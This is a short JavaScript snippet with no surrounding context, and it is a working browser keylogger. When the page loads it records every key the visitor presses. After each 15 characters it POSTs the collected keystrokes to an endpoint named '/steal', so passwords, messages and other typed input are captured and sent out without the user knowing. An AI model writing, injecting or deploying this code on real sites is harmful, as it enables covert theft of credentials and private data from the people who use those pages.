document.addEventListener('DOMContentLoaded', () => {
  let log = "";

  document.addEventListener('keydown', function(event) {
    log += event.key;

    if (log.length >= 15) {
      fetch('/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'log=' + encodeURIComponent(log)
      });
      log = "";
    }
  });
});
